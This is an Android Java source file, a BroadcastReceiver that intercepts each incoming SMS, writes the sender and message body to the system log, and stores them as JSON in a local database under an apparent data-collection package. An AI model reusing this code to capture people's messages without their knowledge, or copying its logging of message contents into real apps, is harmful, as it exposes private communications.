package com.xaviar.events;

import java.util.LinkedList;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.util.Log;

import com.xaviar.collect.sms.Sms;
import com.xaviar.collect.sms.SmsUtil;
import com.xaviar.frm.DataHolder;
import com.xaviar.ui.UserData;
import com.xaviar.utils.DbUtil;

public class SmsEventReceiver extends  BroadcastReceiver {
	
	private static final String TAG = SmsEventReceiver.class.getSimpleName();
	
	  @Override
	  public void onReceive(Context context, Intent intent) {
		if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
			// do something with the received sms
			Log.w(TAG,"SMS:SMS_RECEIVED");
			handleReceive(context,intent);
		} else if (intent.getAction().equals("android.provider.Telephony.SMS_SENT")) {
			// do something with the sended sms
		  Log.w(TAG,"SMS_SENT");
		}
		else
		{
		  Log.e(TAG,"Unsupport action arrived to sms!");	
		  return;
		}


		
	 
	  }

	private void handleReceive(Context context, Intent intent) {
		   Object[] rawMsgs=(Object[])intent.getExtras().get("pdus");
		    
		    for (Object raw : rawMsgs) {
		      SmsMessage msg=SmsMessage.createFromPdu((byte[])raw);
		      handleSmsMessage(msg,context);
		    
		    }		
	}

	private void handleSmsMessage(SmsMessage msg,Context context) {
	      {
	        Log.w("SMS:"+msg.getOriginatingAddress(), msg.getMessageBody());
	        Sms sms = new Sms();
	        sms.setAddress(msg.getOriginatingAddress());	
	        sms.setMsg(msg.getDisplayMessageBody());
	        sms.setFolderName("inbox");
	        sms.setReadState("0");
	        String timeStr = String.valueOf(msg.getTimestampMillis());
	        sms.setTime(timeStr);	
	        sms.setId(timeStr);
            save(context,sms);
	      }		
	}

	private void save(Context ctx,Sms smsMsg) {				
		List<Sms> listSms = new LinkedList<Sms>();
		listSms.add(smsMsg);
		String jsonText = SmsUtil.toJsonArray(listSms);
		Log.w(TAG,"save:jsonText:" + jsonText);
		int index1 = jsonText.indexOf("[");
		jsonText = jsonText.substring(index1+1);		
		jsonText = jsonText.substring(0, jsonText.lastIndexOf(']'));						
		Log.w(TAG,"sms save:jsonText:" + jsonText);				
		UserData userData = new UserData();	
		userData.setText(jsonText);
		userData.setSource(DataHolder.SMS_EVENT);
		List<UserData> userDataList = new LinkedList<UserData>();
		userDataList.add(userData);
		DbUtil.update(ctx, userDataList);		
	}
}
